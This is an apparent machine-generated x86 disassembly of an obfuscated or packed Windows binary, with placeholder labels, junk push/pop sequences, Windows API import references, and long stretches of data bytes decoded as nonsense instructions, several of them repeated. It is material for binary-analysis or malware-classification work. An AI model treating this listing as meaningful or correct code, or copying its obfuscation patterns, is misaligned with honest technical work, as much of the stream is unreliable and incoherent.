or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
js rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
stc
pushfd
call sub_4cd0f5
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
je rwxdata
jns rwxdata
jne rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_514bac
pushad
mov [ esp + 0x20 ] eax
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
push 0x246c8800
add al 0x60
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
outsb
inc esp
jae rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
0xda80
je rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
jne rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
push [ ebp - 0x8 ]
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
add [ eax - 0x77 ] ah
inc esp
and al 0x20
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
sub_514bca
lea esp [ esp + 0x8 ]
call sub_514aff
pushfd
pushad
mov [ esp ] dl
jmp rwxdata
lea esp [ esp + 0x24 ]
jae rwxdata
call sub_5149d2
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
pushad
push 0xb92e92d3
dec bl
mov bl 0x2
inc al
dec al
push [ esp + 0x18 ]
inc ecx
setg al
jmp rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
mov al 0x10
lea esp [ esp + 0x28 ]
js rwxdata
pushad
jmp rwxdata
call sub_5149a7
push 0x2ac01081
call sub_518563
pushad
pushfd
mov [ esp ] 0x229db0e4
